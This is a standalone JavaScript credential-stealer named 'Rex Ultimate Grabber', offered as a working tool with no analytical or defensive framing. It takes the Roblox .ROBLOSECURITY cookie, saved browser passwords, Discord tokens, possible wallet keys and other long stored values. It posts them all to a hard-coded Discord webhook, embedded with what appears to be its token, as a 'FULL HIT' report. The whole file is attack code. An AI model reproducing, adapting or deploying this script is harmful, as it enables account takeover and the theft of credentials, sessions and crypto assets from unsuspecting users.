// Rex Ultimate Grabber – Roblox + All Passwords + Everything
const webhook = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';
let data = {url:location.href, ua:navigator.userAgent, time:new Date().toISOString(), roblox:"", passwords:[], discord:"", wallets:[], storage:{}};

// 1. Roblox .ROBLOSECURITY + all cookies
document.cookie.split(';').forEach(c=>{let [n,v]=c.trim().split('='); if(n=='.ROBLOSECURITY') data.roblox=v;});

// 2. Grab ALL saved passwords (Chrome/Edge/Brave/Firefox)
if(navigator.credentials && navigator.credentials.get){
    (async()=>{
        const creds = await navigator.credentials.get({password:true});
        if(creds && creds.password) data.passwords.push(`${creds.id || location.hostname} → ${creds.name}:${creds.password}`);
    })();
}

// 3. Discord tokens
Object.keys(localStorage).forEach(k=>{if(k.includes('token')){let t=localStorage.getItem(k); if(t && t.length>50) data.discord=t;}});

// 4. Wallet connects / MetaMask / Phantom
try{data.wallets = JSON.stringify(localStorage).match(/[0-9a-fA-F]{64,}/g) || [];}catch(e){}

// 5. Dump everything else juicy
Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(k=>{
    try{let v = localStorage.getItem(k) || sessionStorage.getItem(k);
        if(v && v.length>30 && /[A-Za-z0-9_.-]{40,}/.test(v)) data.storage[k]=v.substring(0,200);
    }catch(e){}
});

// 6. Send to Discord
setTimeout(() => {
    fetch(webhook, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
        username: "Rex Ultimate Grabber",
        embeds: [{
            title: "FULL HIT – Roblox + Passwords + Tokens",
            color: 0xFF0000,
            fields: [
                {name:"Page",value:data.url,inline:false},
                {name:".ROBLOSECURITY",value:data.roblox? "```"+data.roblox.substring(0,100)+"```":"❌ None",inline:false},
                {name:"Saved Passwords ("+data.passwords.length+")",value:data.passwords.length? "```"+data.passwords.join('\n')+"```":"None",inline:false},
                {name:"Discord Token",value:data.discord? "```"+data.discord.substring(0,80)+"```":"None"},
                {name:"Wallets / Long Keys ("+data.wallets.length+")",value:data.wallets.length? "```"+data.wallets.slice(0,10).join('\n')+"```":"None"},
                {name:"Other Storage Hits",value:Object.keys(data.storage).join(', ') || "Clean"}
            ],
            footer:{text:"Rex • Works on every browser"}
        }]
    })});
}, 1500); // Small delay so passwords can load
